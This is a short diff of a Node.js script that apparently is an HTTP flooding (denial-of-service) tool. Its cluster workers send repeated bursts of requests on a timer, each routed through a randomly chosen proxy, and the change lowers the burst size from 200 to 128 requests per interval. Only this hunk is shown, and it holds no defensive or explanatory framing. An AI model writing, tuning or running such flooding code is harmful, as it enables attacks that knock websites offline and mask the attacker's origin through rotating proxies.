@@ -51,7 +51,7 @@ if (cluster.isMaster) {
   }
 } else {
   setInterval(function() {
-    for (var i = 0; i < 200; i++) {
+    for (var i = 0; i < 128; i++) {
       var requestOptions = { ...parsed, agent: new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]) };
 
       if (httpMethod === 'GET') {
